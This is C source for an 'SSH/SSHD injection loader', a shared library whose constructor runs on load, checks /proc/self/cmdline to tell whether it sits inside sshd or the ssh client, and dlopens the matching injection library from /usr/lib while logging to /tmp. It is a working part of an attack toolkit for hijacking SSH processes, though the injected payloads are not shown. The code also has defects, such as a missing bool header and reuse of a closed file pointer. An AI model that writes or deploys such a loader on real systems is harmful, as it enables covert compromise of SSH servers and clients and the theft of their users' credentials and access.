/**
 * SSH/SSHD Injection Loader
 * Detects whether it's running in SSH client or SSHD server
 * and loads the appropriate library.
 */

#include <dlfcn.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>

// Path to the libraries (configurable)
#define CLIENT_LIB_PATH "/usr/lib/libssh_inject.so"
#define SERVER_LIB_PATH "/usr/lib/libsshd_inject.so"

// Flags to prevent multiple initializations
static bool initialized = false;
static void* client_handle = NULL;
static void* server_handle = NULL;

// Check if the current process is sshd
static bool is_sshd_process() {
    char proc_name[256] = {0};
    
    // Read /proc/self/cmdline to get process name
    int fd = open("/proc/self/cmdline", O_RDONLY);
    if (fd < 0) return false;
    
    ssize_t n = read(fd, proc_name, sizeof(proc_name) - 1);
    close(fd);
    
    if (n <= 0) return false;
    
    // Null-terminate the string
    proc_name[n] = '\0';
    
    // Get the base name without path
    char* base_name = strrchr(proc_name, '/');
    if (base_name) {
        base_name++; // Skip the '/'
    } else {
        base_name = proc_name;
    }
    
    // Check if it's sshd
    return (strcmp(base_name, "sshd") == 0);
}

// Check if the current process is ssh client
static bool is_ssh_client_process() {
    char proc_name[256] = {0};
    
    // Read /proc/self/cmdline to get process name
    int fd = open("/proc/self/cmdline", O_RDONLY);
    if (fd < 0) return false;
    
    ssize_t n = read(fd, proc_name, sizeof(proc_name) - 1);
    close(fd);
    
    if (n <= 0) return false;
    
    // Null-terminate the string
    proc_name[n] = '\0';
    
    // Get the base name without path
    char* base_name = strrchr(proc_name, '/');
    if (base_name) {
        base_name++; // Skip the '/'
    } else {
        base_name = proc_name;
    }
    
    // Check if it's ssh client
    return (strcmp(base_name, "ssh") == 0);
}

// Initialize the appropriate library based on the process type
static void initialize() {
    if (initialized) return;
    initialized = true;
    
    FILE* log = fopen("/tmp/ssh_loader.dbg", "a");
    if (log) {
        fprintf(log, "[ + ] Loader initializing for PID %d\n", getpid());
        fclose(log);
    }
    
    // Check if we're running in sshd server
    if (is_sshd_process()) {
        if (log) {
            log = fopen("/tmp/ssh_loader.dbg", "a");
            fprintf(log, "[ + ] Detected sshd process, loading server library\n");
            fclose(log);
        }
        
        // Load the server library
        server_handle = dlopen(SERVER_LIB_PATH, RTLD_LAZY | RTLD_GLOBAL);
        if (!server_handle) {
            if (log) {
                log = fopen("/tmp/ssh_loader.dbg", "a");
                fprintf(log, "[ - ] Failed to load server library: %s\n", dlerror());
                fclose(log);
            }
        }
        return;
    }
    
    // Check if we're running in ssh client
    if (is_ssh_client_process()) {
        if (log) {
            log = fopen("/tmp/ssh_loader.dbg", "a");
            fprintf(log, "[ + ] Detected ssh client process, loading client library\n");
            fclose(log);
        }
        
        // Load the client library
        client_handle = dlopen(CLIENT_LIB_PATH, RTLD_LAZY | RTLD_GLOBAL);
        if (!client_handle) {
            if (log) {
                log = fopen("/tmp/ssh_loader.dbg", "a");
                fprintf(log, "[ - ] Failed to load client library: %s\n", dlerror());
                fclose(log);
            }
        }
        return;
    }
    
    // Not a target process
    if (log) {
        log = fopen("/tmp/ssh_loader.dbg", "a");
        fprintf(log, "[ ! ] Not a target process, nothing to do\n");
        fclose(log);
    }
}

// Constructor function - runs when library is loaded
static __attribute__((constructor)) void init() {
    initialize();
}

// Destructor function - runs when library is unloaded
static __attribute__((destructor)) void fini() {
    // Close the loaded libraries
    if (client_handle) {
        dlclose(client_handle);
        client_handle = NULL;
    }
    
    if (server_handle) {
        dlclose(server_handle);
        server_handle = NULL;
    }
    
    FILE* log = fopen("/tmp/ssh_loader.dbg", "a");
    if (log) {
        fprintf(log, "[ + ] Loader unloaded from PID %d\n", getpid());
        fclose(log);
    }
} 